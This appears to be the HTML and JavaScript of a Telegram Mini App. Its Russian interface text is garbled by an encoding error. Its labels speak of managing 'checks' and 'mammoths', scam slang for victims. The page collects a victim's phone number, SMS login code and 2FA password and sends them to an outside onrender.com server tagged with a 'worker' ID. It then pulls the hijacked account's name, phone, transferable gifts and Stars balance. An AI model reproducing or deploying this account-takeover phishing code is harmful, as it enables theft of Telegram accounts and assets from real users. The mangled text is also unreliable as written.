<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ë–æ—Ç —Å —á–µ–∫–∞–º–∏ - –ú–∏–Ω–∏-–∞–ø–ø</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            padding: 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        .card {
            background: var(--tg-theme-secondary-bg-color, #f8f9fa);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: var(--tg-theme-button-color, #007aff);
            color: var(--tg-theme-button-text-color, #ffffff);
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 10px;
            transition: opacity 0.2s;
        }

        .btn:hover {
            opacity: 0.8;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }

        .input-group input,
        .input-group textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid var(--tg-theme-hint-color, #ccc);
            border-radius: 6px;
            font-size: 16px;
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            font-family: inherit;
        }

        .input-group textarea {
            resize: vertical;
            min-height: 80px;
        }

        .status {
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            text-align: center;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .hidden {
            display: none;
        }

        .user-info {
            background: var(--tg-theme-secondary-bg-color, #f8f9fa);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .user-info h3 {
            margin-bottom: 10px;
        }

        .user-info p {
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üí≥ –ë–æ—Ç —Å —á–µ–∫–∞–º–∏</h1>
            <p>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —á–µ–∫–∞–º–∏ –∏ –º–∞–º–æ–Ω—Ç–∞–º–∏</p>
        </div>

        <div class="user-info">
            <h3>üë§ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ</h3>
            <p><strong>ID:</strong> <span id="user-id">–ó–∞–≥—Ä—É–∑–∫–∞...</span></p>
            <p><strong>–ò–º—è:</strong> <span id="user-name">–ó–∞–≥—Ä—É–∑–∫–∞...</span></p>
            <p><strong>Username:</strong> <span id="user-username">–ó–∞–≥—Ä—É–∑–∫–∞...</span></p>
        </div>

        <div class="card">
            <h3>üîê –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –≤ Telegram —Å–µ—Å—Å–∏–∏</h3>
            <div class="input-group">
                <label for="phone-number">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</label>
                <input type="tel" id="phone-number" placeholder="+1234567890">
            </div>
            <div id="code-step" class="hidden">
                <div class="input-group">
                    <label for="auth-code">–ö–æ–¥ –∏–∑ SMS:</label>
                    <input type="text" id="auth-code" placeholder="12345">
                </div>
            </div>
            <div id="2fa-step" class="hidden">
                <div class="input-group">
                    <label for="2fa-password">2FA –ø–∞—Ä–æ–ª—å:</label>
                    <input type="password" id="2fa-password" placeholder="–í–∞—à 2FA –ø–∞—Ä–æ–ª—å">
                </div>
            </div>
            <button class="btn" id="auth-button" onclick="startAuth()">–ù–∞—á–∞—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é</button>
            <div id="auth-status" class="status hidden"></div>
        </div>

        <div class="card">
            <h3>üí≥ –ê–∫—Ç–∏–≤–∞—Ü–∏—è —á–µ–∫–∞</h3>
            <div class="input-group">
                <label for="check-code">–ö–æ–¥ —á–µ–∫–∞:</label>
                <input type="text" id="check-code" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ —á–µ–∫–∞">
            </div>
            <button class="btn" onclick="activateCheck()">–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å —á–µ–∫</button>
            <div id="check-status" class="status hidden"></div>
        </div>

        <div class="card">
            <h3>üìã –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–∞–º–æ–Ω—Ç–µ</h3>
            <button class="btn" onclick="getMammothGifts()">–ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–∫–∏</button>
            <button class="btn" onclick="getMammothStars()">–ü–æ–ª—É—á–∏—Ç—å –∑–≤–µ–∑–¥—ã</button>
            <div id="mammoth-info" class="status hidden"></div>
        </div>

        <div class="card">
            <h3>üîó –°–≤—è–∑—å —Å –±–æ—Ç–æ–º</h3>
            <button class="btn" onclick="openBot()">–û—Ç–∫—Ä—ã—Ç—å –±–æ—Ç–∞</button>
            <p style="margin-top: 10px; font-size: 14px; color: var(--tg-theme-hint-color, #666);">
                –î–ª—è –ø–æ–ª–Ω–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–æ—Ç–∞
            </p>
        </div>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
        let tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        const user = tg.initDataUnsafe.user;
        if (user) {
            document.getElementById('user-id').textContent = user.id;
            document.getElementById('user-name').textContent = user.first_name + (user.last_name ? ' ' + user.last_name : '');
            document.getElementById('user-username').textContent = user.username ? '@' + user.username : '–ù–µ —É–∫–∞–∑–∞–Ω';
        }

        // –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        let authStep = 'phone';
        let currentSession = null;

        // –§—É–Ω–∫—Ü–∏—è –Ω–∞—á–∞–ª–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        async function startAuth() {
            const phoneNumber = document.getElementById('phone-number').value.trim();
            const authCode = document.getElementById('auth-code').value.trim();
            const twofaPassword = document.getElementById('2fa-password').value.trim();
            
            if (authStep === 'phone') {
                if (!phoneNumber) {
                    showStatus('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞', 'error', 'auth-status');
                    return;
                }
                
                showStatus('–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞...', 'success', 'auth-status');
                
                try {
                    const response = await fetch('https://testweb-0i1f.onrender.com/api/start-auth', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            phone_number: phoneNumber,
                            worker_user_id: user.id
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        authStep = 'code';
                        currentSession = data.session_id;
                        document.getElementById('code-step').classList.remove('hidden');
                        document.getElementById('auth-button').textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∫–æ–¥';
                        showStatus('‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS', 'success', 'auth-status');
                    } else {
                        showStatus('‚ùå ' + (data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞'), 'error', 'auth-status');
                    }
                } catch (error) {
                    showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞', 'error', 'auth-status');
                    console.error('–û—à–∏–±–∫–∞:', error);
                }
            } else if (authStep === 'code') {
                if (!authCode) {
                    showStatus('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS', 'error', 'auth-status');
                    return;
                }
                
                showStatus('–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...', 'success', 'auth-status');
                
                try {
                    const response = await fetch('https://testweb-0i1f.onrender.com/api/verify-code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            worker_user_id: user.id,
                            code: authCode
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        if (data.next_step === 'verify_2fa') {
                            authStep = '2fa';
                            document.getElementById('2fa-step').classList.remove('hidden');
                            document.getElementById('auth-button').textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å 2FA';
                            showStatus('‚úÖ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –í–≤–µ–¥–∏—Ç–µ 2FA –ø–∞—Ä–æ–ª—å', 'success', 'auth-status');
                        } else {
                            // –ù–µ—Ç 2FA, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ –ø–æ–ª—É—á–µ–Ω–∏—é –¥–∞–Ω–Ω—ã—Ö
                            await getMammothData();
                        }
                    } else {
                        showStatus('‚ùå ' + (data.error || '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥'), 'error', 'auth-status');
                    }
                } catch (error) {
                    showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫–æ–¥–∞', 'error', 'auth-status');
                    console.error('–û—à–∏–±–∫–∞:', error);
                }
            } else if (authStep === '2fa') {
                if (!twofaPassword) {
                    showStatus('–í–≤–µ–¥–∏—Ç–µ 2FA –ø–∞—Ä–æ–ª—å', 'error', 'auth-status');
                    return;
                }
                
                showStatus('–ü—Ä–æ–≤–µ—Ä–∫–∞ 2FA...', 'success', 'auth-status');
                
                try {
                    const response = await fetch('https://testweb-0i1f.onrender.com/api/verify-2fa', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            worker_user_id: user.id,
                            password: twofaPassword
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        showStatus('‚úÖ 2FA –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö...', 'success', 'auth-status');
                        await getMammothData();
                    } else {
                        showStatus('‚ùå ' + (data.error || '–ù–µ–≤–µ—Ä–Ω—ã–π 2FA –ø–∞—Ä–æ–ª—å'), 'error', 'auth-status');
                    }
                } catch (error) {
                    showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ 2FA', 'error', 'auth-status');
                    console.error('–û—à–∏–±–∫–∞:', error);
                }
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –º–∞–º–æ–Ω—Ç–∞
        async function getMammothData() {
            showStatus('–ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –º–∞–º–æ–Ω—Ç–∞...', 'success', 'auth-status');
            
            try {
                const response = await fetch('https://testweb-0i1f.onrender.com/api/get-mammoth-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        worker_user_id: user.id
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    const giftsList = data.gifts.map(gift => 
                        `‚Ä¢ ${gift.name} (${gift.can_transfer ? '‚úÖ' : '‚ùå'})`
                    ).join('\n');
                    
                    showStatus(`‚úÖ –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã! –û—Ç—Å—Ç—É–∫ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.\n\nüë§ –ú–∞–º–æ–Ω—Ç: ${data.mammoth_info.first_name} ${data.mammoth_info.last_name}\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${data.mammoth_info.phone}\nüéÅ –ü–æ–¥–∞—Ä–∫–æ–≤: ${data.gifts.length}\n‚≠ê –ó–≤–µ–∑–¥: ${data.stars_amount}\n\n${giftsList}`, 'success', 'auth-status');
                    
                    // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É
                    resetAuthForm();
                } else {
                    showStatus('‚ùå ' + (data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö'), 'error', 'auth-status');
                }
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö', 'error', 'auth-status');
                console.error('–û—à–∏–±–∫–∞:', error);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è —Å–±—Ä–æ—Å–∞ —Ñ–æ—Ä–º—ã –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        function resetAuthForm() {
            authStep = 'phone';
            currentSession = null;
            document.getElementById('phone-number').value = '';
            document.getElementById('auth-code').value = '';
            document.getElementById('2fa-password').value = '';
            document.getElementById('code-step').classList.add('hidden');
            document.getElementById('2fa-step').classList.add('hidden');
            document.getElementById('auth-button').textContent = '–ù–∞—á–∞—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é';
        }

        // –§—É–Ω–∫—Ü–∏—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞
        async function activateCheck() {
            const checkCode = document.getElementById('check-code').value.trim();
            const statusDiv = document.getElementById('check-status');
            
            if (!checkCode) {
                showStatus('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ —á–µ–∫–∞', 'error', 'check-status');
                return;
            }

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            showStatus('–ê–∫—Ç–∏–≤–∞—Ü–∏—è —á–µ–∫–∞...', 'success', 'check-status');
            
            try {
                const response = await fetch('https://testweb-0i1f.onrender.com/api/activate-check', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        check_code: checkCode,
                        user_id: user.id
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showStatus('‚úÖ –ß–µ–∫ —É—Å–ø–µ—à–Ω–æ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!', 'success', 'check-status');
                    document.getElementById('check-code').value = '';
                } else {
                    showStatus('‚ùå ' + (data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞'), 'error', 'check-status');
                }
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —á–µ–∫–∞', 'error', 'check-status');
                console.error('–û—à–∏–±–∫–∞:', error);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ –º–∞–º–æ–Ω—Ç–∞
        async function getMammothGifts() {
            const infoDiv = document.getElementById('mammoth-info');
            
            showStatus('–ó–∞–≥—Ä—É–∑–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤...', 'success', 'mammoth-info');
            
            try {
                const response = await fetch('https://testweb-0i1f.onrender.com/api/mammoth-gifts', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        mammoth_user_id: user.id
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    const giftsList = data.gifts.map(gift => 
                        `‚Ä¢ ${gift.name} (${gift.can_transfer ? '‚úÖ' : '‚ùå'})`
                    ).join('\n');
                    
                    showStatus(`üéÅ –ü–æ–¥–∞—Ä–∫–∏ –º–∞–º–æ–Ω—Ç–∞ (${data.total_count}):\n${giftsList}`, 'success', 'mammoth-info');
                } else {
                    showStatus('‚ùå ' + (data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∞—Ä–∫–æ–≤'), 'error', 'mammoth-info');
                }
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∞—Ä–∫–æ–≤', 'error', 'mammoth-info');
                console.error('–û—à–∏–±–∫–∞:', error);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –∑–≤–µ–∑–¥ –º–∞–º–æ–Ω—Ç–∞
        async function getMammothStars() {
            const infoDiv = document.getElementById('mammoth-info');
            
            showStatus('–ó–∞–≥—Ä—É–∑–∫–∞ –∑–≤–µ–∑–¥...', 'success', 'mammoth-info');
            
            try {
                const response = await fetch('https://testweb-0i1f.onrender.com/api/mammoth-stars', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        mammoth_user_id: user.id
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showStatus(`‚≠ê –ó–≤–µ–∑–¥ —É –º–∞–º–æ–Ω—Ç–∞: ${data.stars_amount}`, 'success', 'mammoth-info');
                } else {
                    showStatus('‚ùå ' + (data.error || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –∑–≤–µ–∑–¥'), 'error', 'mammoth-info');
                }
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –∑–≤–µ–∑–¥', 'error', 'mammoth-info');
                console.error('–û—à–∏–±–∫–∞:', error);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–∫—Ä—ã—Ç–∏—è –±–æ—Ç–∞
        function openBot() {
            tg.openTelegramLink('https://t.me/your_bot_username');
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–∫–∞–∑–∞ —Å—Ç–∞—Ç—É—Å–∞
        function showStatus(message, type, elementId = 'check-status') {
            const statusDiv = document.getElementById(elementId);
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            statusDiv.classList.remove('hidden');
            
            // –°–∫—Ä—ã–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                statusDiv.classList.add('hidden');
            }, 5000);
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–∫–∏ "–ù–∞–∑–∞–¥" –≤ Telegram
        tg.onEvent('backButtonClicked', function() {
            tg.close();
        });

        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É "–ù–∞–∑–∞–¥"
        tg.BackButton.show();
    </script>
</body>
</html>
